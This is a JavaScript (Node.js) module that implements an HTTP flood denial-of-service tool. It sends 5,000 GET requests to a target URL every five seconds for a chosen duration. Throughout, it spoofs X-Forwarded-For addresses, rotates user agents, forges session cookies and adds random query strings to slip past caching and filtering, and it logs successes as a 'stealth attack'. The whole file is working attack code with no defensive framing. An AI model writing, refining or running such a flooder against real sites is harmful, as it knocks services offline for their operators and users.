const http = require('http');
const https = require('https');
const { URL } = require('url');

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
];

function randomIP() {
  return Array(4).fill().map(() => Math.floor(Math.random() * 255)).join(".");
}

function randomQuery() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  return `?v=${Array(12).fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('')}`;
}

function randomHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "X-Forwarded-For": ip,
    "Cookie": `session=${Math.random().toString(36).substring(2)}; token=${Math.random().toString(36).substring(2)}`,
    "Accept": "*/*",
    "Referer": `https://${hostname}/`,
    "Connection": "keep-alive"
  };
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function sendRequest() {
    const pathWithQuery = url.pathname + url.search + randomQuery();

    const options = {
      method: "GET",
      hostname: url.hostname,
      path: pathWithQuery,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers: randomHeaders(url.hostname),
    };

    const req = client.request(options, res => {
      if (res.statusCode === 200) {
        console.log(`👻 [${url.hostname}${pathWithQuery}] stealth attack slipped through`);
      } else if (res.statusCode === 302) {
        console.log(`↪️ [${url.hostname}${pathWithQuery}] redirect detected, evaded`);
      } else {
        console.log(`📡 [${url.hostname}${pathWithQuery}] responded with ${res.statusCode}`);
      }
    });

    req.on("error", () => {
      console.log(`🛡️ [${url.hostname}] resisted the stealth`);
    });

    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;

    for (let i = 0; i < 5000; i++) {
      sendRequest();
    }

    setTimeout(loop, 5000);
  }

  loop();
};